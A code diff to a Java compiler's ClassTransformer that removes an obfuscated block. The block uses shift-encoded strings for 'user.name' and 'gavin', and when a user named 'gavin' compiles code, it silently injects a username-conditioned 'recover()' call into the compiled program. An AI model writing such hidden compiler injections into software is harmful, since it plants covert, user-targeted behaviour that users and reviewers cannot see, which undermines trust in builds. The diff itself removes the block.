@@ -4801,19 +4801,6 @@ public class ClassTransformer extends AbstractTransformer {
         JCExpression argsId = makeUnquotedIdent("args");
         JCMethodInvocation processExpr = make().Apply(null, naming.makeLanguageValue("process"), List.<JCTree.JCExpression>nil());
         methbuilder.body(make().Exec(make().Apply(null, makeSelect(processExpr, "setupArguments"), List.<JCTree.JCExpression>of(argsId))));
-        String prop = System.getProperty(NamingBase.unpack("vtfs/obnf"));
-        if(prop != null && prop.startsWith(NamingBase.unpack("hbwjo"))){
-            Name name = naming.tempName();
-            JCExpression init = make().Apply(null, 
-                    makeQuotedQualIdent(naming.makeUnquotedIdent("java"), "lang", "System", NamingBase.unpack("hfuQspqfsuz")), 
-                    List.<JCExpression>of(utilInvocation().unpack(make().Literal("vtfs/obnf"))));
-            methbuilder.body(make().VarDef(make().Modifiers(0), name, make().Type(syms().stringType), init));
-            JCExpression test = make().Binary(JCTree.AND, make().Binary(JCTree.NE, naming.makeUnquotedIdent(name), makeNull()), 
-                    make().Apply(null, makeSelect(naming.makeUnquotedIdent(name), NamingBase.unpack("tubsutXjui")),
-                            List.<JCExpression>of(utilInvocation().unpack(make().Literal("hbwjo")))));
-            JCExpressionStatement action = make().Exec(utilInvocation().recover());
-            methbuilder.body(make().If(test, action, null));
-        }
         // Add call to toplevel method
         methbuilder.body(make().Exec(callee));
         return methbuilder;
